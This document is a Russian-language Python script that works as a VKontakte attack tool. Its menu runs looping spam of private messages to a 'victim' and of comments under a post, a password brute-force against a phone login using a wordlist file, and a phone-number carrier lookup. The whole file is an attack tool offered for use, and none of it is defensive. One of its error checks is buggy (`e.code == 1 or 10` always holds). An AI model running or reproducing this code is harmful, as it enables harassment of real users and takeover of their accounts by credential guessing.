import vk_api, os, time, random, requests

os.system("cls")

banner = """
\n____________________________________________________________________________
[1] - Спам в личные сообщения [2] - Спам комментариями под определенный пост
[3] - Подбор пароля(бета) [4] - Информация о телефоне [5] - Очистить
____________________________________________________________________________
"""
def start():
	while True:
		print(banner)
		number = input("[Выберите 1,2,3,4,5]-> ")
		try:
			if number == "1":
				token_katemobile = input("Для спама в личные сообщения введите токен VK Admin: ") # Массив с токеном VK Admin
				usr_id = input("Цифровой(вечный) айди жертвы: ") # Massive
				msg_1 = input("Сообщение: ") # Massive
				while True:
					try:
						sessions = vk_api.VkApi(token = token_katemobile)
						vks = sessions.get_api()
						print("Сообщение - > ", msg_1, " -> ID: ",
						 vks.messages.send(user_id = usr_id, message = msg_1, random_id = random.randint(0, 9999999999)))
						time.sleep(3)
					except:
						print("Вы ввели неверный токен/айди или вк запросил капчу!")
						pass
			elif number == "2":
				token_vkadmin = input("Введите токен VK Admin: ") # Массив с токеном VK ADMIN
				own_id = input("Цифровой(вечный) айди вашей страницы: ") # Massive
				pst_id = input("Айди поста(в ссылке последние цифры после _): ") # Massive
				msg_2 = input("Комментарий: ")
				while True:
					try:
						session = vk_api.VkApi(token = token_vkadmin)
						vk = session.get_api()
						print(vk.wall.createComment(owner_id = own_id, post_id = pst_id,
						 message = msg_2, guid = random.randint(0, 9999999999)))
						time.sleep(3)
					except:
						print("Вы ввели неверный токен/айди или вк запросил капчу!")
						pass
			elif number == "5":
				os.system("cls")
			elif number == "3":
				phone = input("Телефон(логин): ")
				file = "base.txt" # Список с паролями(каждый пароль в отдельной строке)
				with open(file) as f:
					lines = f.readlines()
				lines = [line.strip('\n') for line in open(file)]
				for password in lines:
					try:
						vk_session = vk_api.VkApi(phone, str(password))
						vk_session.auth()
						print(phone, ":Пароль найден: " + str(password))
						time.sleep(20)
					except Exception as e:
						if e.code == 14:
							print("ВКонтакте запросил капчу[(14)]. Идентификатор:" + str(e.sid) + ", Капча:" + str(e.url))
						elif e.code == 5:
							print("Авторизация пользователя не удалась[(5)].")
						elif e.code == 1 or 10:
							print("Произошла неизвестная ошибка со стороны ВКонтакте[(1 or 10)].")
						elif e.code == 6:
							print("Слишком много запросов в секунду[(6)].")
						elif e.code == 8:
							print("Неверный запрос[(8)].")
						elif e.code == 9:
							print("Слишком много однотипных действий[(9)].")
						elif e.code == 16:
							print("Требуется выполнение запросов по протоколу HTTPS,"
								+ "т.к. пользователь включил настройку, требующую работу через безопасное соединение[(16)].")
						elif e.code == 17:
							print("Требуется валидация пользователя[(17)].")
						elif e.code == 18:
							print("Страница удалена или заблокирована[(18)].")
						elif e.code == 100:
							print("Один из необходимых параметров был не передан или неверен[(100)].")
						else:
							print("Код ошибки:", e.code)
							time.sleep(15)
					time.sleep(1)
			elif number == "4":
				try:
					phone = input("Телефон:")
					scan_info = requests.get("https://htmlweb.ru/geo/api.php?json&telcod=" + phone)
					data = scan_info.json()
					country = str(data["country"]["fullname"])
					idd = str(data["country"]["id"])
					code_country = str(data["country"]["telcod"])
					lengh_code = str(data["country"]["telcod_len"])
					location_country = str(data["country"]["location"])
					operator = str(data["0"]["oper"])
					print("| Страна: " + str(country) + "(" + str(idd) + ") |")
					print("| Контитент: " + str(location_country) + " |")
					print("| Код страны: +" + str(code_country) + "(длина номера в стране " + str(lengh_code) +") |")
					print("| Оператор: " + str(operator) + " |")
				except Exception:
					print("Исчерпан лимит запросов в день на один IP")
			else:
				print("Выберите правильную цифру!")
		except ModuleNotFoundError as mnf:
			print(mnf)
			print("Установите библиотеку показанную выше!")
start()